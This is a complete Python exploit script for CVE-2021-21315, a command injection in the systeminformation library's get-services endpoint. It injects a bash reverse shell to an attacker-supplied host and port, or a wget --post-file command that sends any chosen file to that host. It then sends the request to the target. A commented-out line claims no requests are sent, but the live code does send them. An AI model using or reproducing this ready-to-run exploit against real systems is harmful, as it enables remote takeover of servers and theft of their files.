#!/usr/bin/env python3

import argparse
import urllib.parse
import sys
import requests

def make_reverse_shell(lhost, lport):
    """
    A simple bash reverse shell command.
    """
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def inject_payload_in_url(base_url, payload):
    """
    Inject the payload into a URL parameter, URL-encoded.
    """
    return f"{base_url}/api/get-services?name[]=$({payload})"

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2021-21315 - Command Injection in systeminformation < 5.3.1"
    )
    parser.add_argument("--host", required=True, help="Target base URL (e.g., http://victim.com)")
    parser.add_argument("--lhost", help="Attacker IP for reverse shell callback")
    parser.add_argument("--lport", help="Attacker port for reverse shell callback")
    parser.add_argument("--payload", help="Custom code to execute (overrides reverse shell)")
    parser.add_argument("--read-file", help="Enter the file path to read")
    args = parser.parse_args()

    # Validate host
    if not args.host.startswith(("http://", "https://")):
        print("[!] Error: --host must start with http:// or https://")
        sys.exit(1)

    # Decide which payload to use
    if args.payload:
        payload_code = args.payload
    else:
        if not (args.lhost and args.lport):
            print("[!] Error: --lhost and --lport are required if --payload is not supplied")
            sys.exit(1)
        if not args.lport.isdigit():
            print("[!] Error: --lport must be a valid integer")
            sys.exit(1)
        payload_code = make_reverse_shell(args.lhost, args.lport)

    injected_url = inject_payload_in_url(args.host, payload_code)

    if args.read_file:
        payload_code = f"wget --post-file {args.read_file} {args.lhost}:{args.lport}"
        injected_url = inject_payload_in_url(args.host, payload_code)

    # print(f"[+] Payload to Inject: {payload_code}")
    # print(f"[+] Example Malicious URL: {injected_url}")
    # print("\n[!] PoC only: No requests are sent. Use responsibly in a controlled environment.")
    print("--------------------------------")
    print(f"Sending Payload")
    print("--------------------------------")
    response = requests.get(injected_url)


if __name__ == "__main__":
    main()
